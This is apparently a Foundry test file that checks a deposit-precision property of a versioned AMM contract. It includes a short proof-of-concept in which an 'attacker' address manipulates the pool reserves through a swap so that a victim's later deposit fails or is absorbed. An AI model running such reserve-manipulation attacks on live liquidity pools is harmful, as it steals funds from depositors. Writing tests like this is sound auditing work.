// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "versions/AMM_v6.sol" as V6;
import "versions/lib/IERC20.sol";

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000 * 1e18;
    constructor() { balanceOf[msg.sender] = totalSupply; }
    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value; balanceOf[to] += value; return true;
    }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value; return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value; return true;
    }
}

contract DepositPrecisionV6Test is Test {
    V6.AMM ammV6;
    MockToken token0;
    MockToken token1;
    address attacker = address(0x1337);
    address victim = address(0x1234);

    function setUp() public {
        token0 = new MockToken();
        token1 = new MockToken();
        ammV6 = new V6.AMM(IERC20(address(token0)), IERC20(address(token1)));

        token0.transfer(attacker, 10000);
        token1.transfer(attacker, 10000);
        token0.transfer(victim, 10000);
        token1.transfer(victim, 10000);

        vm.startPrank(attacker);
        token0.approve(address(ammV6), type(uint256).max);
        token1.approve(address(ammV6), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        token0.approve(address(ammV6), type(uint256).max);
        token1.approve(address(ammV6), type(uint256).max);
        vm.stopPrank();
    }

    // deposit-precision:
    // After a non-reverting `deposit` transaction where the deposited amounts are proportional to the reserves and are at least one-thousandth of the current reserves, the minted liquidity tokens are strictly positive and do not exceed the proportion between the deposited amounts and the contract's existing reserves.

    // PoC:
    // - Step 1 (setup): The initial liquidity provider deposits tokens to initialize the pool.
    // - Step 2 (attack): The attacker manipulates the reserves via swaps to inflate the LP token value. When a victim subsequently deposits tokens, integer division truncates the minted liquidity to zero, absorbing funds without minting LP tokens.
    function test_inflation_attack_truncation_v6() public {
        vm.startPrank(attacker);

        ammV6.deposit(100, 100);

        ammV6.swap(address(token0), 100, 0);

        vm.stopPrank();

        assertEq(ammV6.r0(), 200);
        assertEq(ammV6.r1(), 0);
        assertEq(ammV6.supply(), 100);

        vm.startPrank(victim);

        vm.expectRevert();
        ammV6.deposit(1, 1);

        vm.stopPrank();
    }
}
